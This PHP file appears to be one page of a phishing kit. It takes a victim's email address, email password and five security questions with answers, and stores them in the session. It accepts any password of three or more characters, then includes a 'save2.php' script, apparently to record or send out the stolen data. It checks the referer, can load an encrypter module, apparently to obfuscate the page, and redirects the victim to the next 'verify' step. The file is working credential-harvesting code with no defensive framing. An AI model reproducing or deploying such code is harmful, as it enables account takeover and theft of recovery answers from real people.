<?php
session_start();

require_once 'inc/functions.php';
require_once 'inc/config.php';

$isValidPassword = false;
$isValidEmail = false;
$errno = 1;


if (isset($_SERVER['HTTP_REFERER']) && isset($_SERVER['HTTP_HOST']) && isset($_SESSION['USER_OK']) && $_SESSION['USER_OK'] === 'OK' && isset($_SESSION['SESSION_ID'])) {
    $ref = $_SERVER['HTTP_REFERER'];
    $host = $_SERVER['HTTP_HOST'];
    $host2 = bin2hex($_SERVER['HTTP_HOST']);
    if (isset($_POST['email']) && !empty($_POST['email'])) {
        if(is_email($_POST['email'])) {
		$isValidEmail = true;
        $_SESSION['Email'] = $_POST['email'];    
	   }
    }
	
	if (isset($_POST['emailpass']) && !empty($_POST['emailpass'])) {
        if (strlen($_POST['emailpass']) >= 3) {
            $isValidPassword = true;
            $_SESSION['Emailpass'] = $_POST['emailpass'];
        }
        else
        {
            $errno = 1;
        }
    }
    
    if (!$isValidPassword || !$isValidEmail) {
        header("Location: verify.php?invalid=true&error=" . $errno . "&session=" . $host2);
    } else {
        if (strpos($ref, $host) !== FALSE) {
            $_SESSION['Question1'] = $_POST['question1'];
            $_SESSION['Ans1'] = $_POST['ans1'];
            $_SESSION['Question2'] = $_POST['question2'];
            $_SESSION['Ans2'] = $_POST['ans2'];
            $_SESSION['Question3'] = $_POST['question3'];
            $_SESSION['Ans3'] = $_POST['ans3'];
            $_SESSION['Question4'] = $_POST['question4'];
            $_SESSION['Ans4'] = $_POST['ans4'];
            $_SESSION['Question5'] = $_POST['question5'];
            $_SESSION['Ans5'] = $_POST['ans5'];
            $include = 1;
            include("inc/save2.php");
        }
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<?php 
if($enable_encrypter) {
	require_once 'inc/encrypter.php'; 
}
?>

<script>
	window.irOn=true;
</script>
</head>
<body>
<meta http-equiv="refresh" content="0; url=verify2.php?p=1&session=<?=$host2?>" />
<? header("refresh:0; url=verify2.php?p=1&session=".$host2);?>
</body>

</html>